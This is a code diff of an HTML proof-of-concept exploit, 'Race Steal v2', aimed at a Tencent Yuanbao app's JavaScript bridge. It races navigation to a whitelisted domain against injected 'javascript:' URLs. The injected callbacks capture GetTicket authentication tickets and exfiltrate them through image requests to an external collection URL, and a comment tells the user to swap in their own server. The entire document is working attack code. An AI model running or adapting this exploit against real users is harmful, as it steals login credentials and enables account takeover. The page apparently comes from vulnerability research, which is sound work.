@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Race Steal PoC</title></head>
+<head><meta charset="utf-8"><title>Race Steal v2</title></head>
 <body>
-<h2>JSBridge Race - GetTicket Chain</h2>
+<h2>JSBridge Race - GetTicket (javascript: inject)</h2>
 <pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
 <script>
 var log = document.getElementById('log');
@@ -17,58 +17,62 @@ function callJSBridge(module, method, param, cbName) {
     window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
 }
 
-// recv.html 的地址
-var RECV_URL = "https://zhuos6678-test.github.io/huiyitest112233.github.io/recv.html";
+// 外传地址（改成你自己的服务器，这里用 GitHub 的 404 仅做标记）
+var EXFIL = "https://zhuos6678-test.github.io/huiyitest112233.github.io/collect";
+
+// 构造 javascript: URL，注入 callback 函数到当前页面
+// 这些函数被调用时会通过 Image 外传数据
+var JS_INJECT = "javascript:void("
+    + "window.steal_cb_w9=function(d){document.title='W9:'+d;new Image().src='" + EXFIL + "?t=w9&d='+encodeURIComponent(d)},"
+    + "window.steal_cb_w10=function(d){document.title='W10:'+d;new Image().src='" + EXFIL + "?t=w10&d='+encodeURIComponent(d)},"
+    + "window.steal_cb_w14=function(d){document.title='W14:'+d;new Image().src='" + EXFIL + "?t=w14&d='+encodeURIComponent(d)},"
+    + "window.steal_cb_page=function(d){document.title='PAGE:'+d;new Image().src='" + EXFIL + "?t=page&d='+encodeURIComponent(d)}"
+    + ")";
 
 function doRace() {
     if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
-    addLog('=== Race Steal: GetTicket ===');
+    addLog('=== Race Steal v2: javascript: inject ===');
     addLog('URL: ' + location.href);
 
     // 1. navigate 到白名单域名
     location.href = "https://yuanbao.tencent.com/";
 
-    // 2. 竞态窗口中：先发 GetTicket，再发 LoadUrl
-    //    GetTicket 用固定 callback 名 "steal_cb"，recv.html 会定义这个函数
-    //    GetTicket 在前，LoadUrl 在后，这样：
-    //      - GetTicket 到达主进程时 URL=yuanbao → PASS → handler 执行
-    //      - LoadUrl 到达主进程 → 加载 recv.html
-    //      - GetTicket callback (evaluateJavascript) 到达时 recv.html 已加载 → steal_cb 被调用
+    // 2. 竞态窗口中：
+    //    a) 先用 LoadUrl("javascript:...") 注入 callback（瞬间执行，不改 URL）
+    //    b) 再调 GetTicket（URL 仍是 yuanbao → PASS）
+    //    c) callback 发到当前页面 → 找到注入的 steal_cb_xxx → 捕获
 
     var delays = [0, 30, 60, 100, 150, 200, 250, 300, 400, 500];
     for (var d = 0; d < delays.length; d++) {
         (function(delay) {
             setTimeout(function() {
                 try {
-                    // 先发 GetTicket（3 种 ticket_type）
+                    // 先注入 callback
+                    callJSBridge('CommonPlugin', 'LoadUrl', {url: JS_INJECT}, 'cb_inject_' + delay);
+                    // 再调 GetTicket
                     callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
                     callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 1}, 'steal_cb_w10');
                     callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 2}, 'steal_cb_w14');
                     callJSBridge('CommonPlugin', 'GetCurrentPageTicket', {}, 'steal_cb_page');
-                    // 再发 LoadUrl 加载 recv.html
-                    callJSBridge('CommonPlugin', 'LoadUrl', {url: RECV_URL}, 'steal_cb_load');
-                    addLog('[' + delay + 'ms] GetTicket x3 + LoadUrl sent');
-                } catch(e) {
-                    addLog('[' + delay + 'ms] ERR: ' + e.message);
-                }
+                } catch(e) {}
             }, delay);
         })(delays[d]);
     }
 
-    // 高频 setInterval 版本
+    // setInterval 高频
     var intervalCount = 0;
     var iv = setInterval(function() {
         intervalCount++;
         try {
+            callJSBridge('CommonPlugin', 'LoadUrl', {url: JS_INJECT}, 'cb_iv_inject');
             callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
-            callJSBridge('CommonPlugin', 'LoadUrl', {url: RECV_URL}, 'steal_cb_load');
         } catch(e) {
             clearInterval(iv);
         }
         if (intervalCount > 100) clearInterval(iv);
     }, 0);
 
-    addLog('Race started');
+    addLog('Race started: inject + GetTicket');
 }
 
 setTimeout(function() {
